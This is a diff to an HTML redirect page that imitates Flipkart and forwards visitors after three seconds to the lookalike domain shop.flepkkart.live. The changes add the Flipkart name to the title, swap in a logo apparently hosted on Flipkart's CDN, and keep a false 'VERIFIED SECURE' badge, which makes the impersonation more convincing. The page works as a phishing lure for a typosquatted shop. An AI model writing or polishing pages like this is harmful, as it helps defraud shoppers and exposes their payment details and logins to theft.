@@ -3,13 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="3;url=https://shop.flepkkart.live/shop">
-  <title>Redirecting...</title>
+  <title>Flipkart - Redirecting</title>
 
   <style>
-    body {
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
       height: 100vh;
-      background: #0b1c33;
+      width: 100vw;
+      background: linear-gradient(180deg, #0b1c33, #081426);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,50 +23,53 @@
       color: #fff;
     }
 
-    .card {
-      background: #10294b;
-      padding: 40px 30px;
-      border-radius: 12px;
+    .container {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .content {
       text-align: center;
-      width: 280px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
     }
 
     .logo {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
+      width: 130px;   /* 🔥 BIGGER CIRCLE */
+      height: 130px;
       background: #fff;
-      margin: 0 auto 15px;
+      border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
+      margin: 0 auto 25px;
     }
 
     .logo img {
-      width: 45px;
+      width: 85px;   /* 🔥 BIGGER LOGO */
     }
 
     h2 {
-      margin: 10px 0 5px;
-      font-size: 20px;
-      letter-spacing: 1px;
+      font-size: 24px;
+      letter-spacing: 1.2px;
+      margin-bottom: 8px;
     }
 
     p {
-      font-size: 14px;
-      opacity: 0.8;
-      margin-bottom: 20px;
+      font-size: 15px;
+      opacity: 0.85;
+      margin-bottom: 30px;
     }
 
     .spinner {
-      width: 40px;
-      height: 40px;
+      width: 50px;
+      height: 50px;
       border: 4px solid rgba(255,255,255,0.3);
       border-top: 4px solid #1da1f2;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 0 auto 15px;
+      margin: 0 auto 20px;
     }
 
     @keyframes spin {
@@ -69,24 +78,29 @@
     }
 
     .secure {
-      font-size: 12px;
+      font-size: 13px;
       color: #9bc9ff;
+      opacity: 0.9;
     }
   </style>
 </head>
 
 <body>
-  <div class="card">
-    <div class="logo">
-      <img src="https://img.icons8.com/?size=100&id=Noove1mRsJOq&format=png&color=000000" alt="Flipkart">
+  <div class="container">
+    <div class="content">
+      <div class="logo">
+        <img
+          src="https://rukminim2.flixcart.com/www/120/120/promos/01/07/2023/9c8ff2d4-8b6f-4ed3-9c9c-25f0e1b6fba7.png"
+          alt="Flipkart">
+      </div>
+
+      <h2>PLEASE WAIT</h2>
+      <p>Redirecting to your destination…</p>
+
+      <div class="spinner"></div>
+
+      <div class="secure">✔ VERIFIED SECURE</div>
     </div>
-
-    <h2>PLEASE WAIT</h2>
-    <p>Redirecting to your destination…</p>
-
-    <div class="spinner"></div>
-
-    <div class="secure">✔️ VERIFIED SECURE</div>
   </div>
 </body>
 </html>
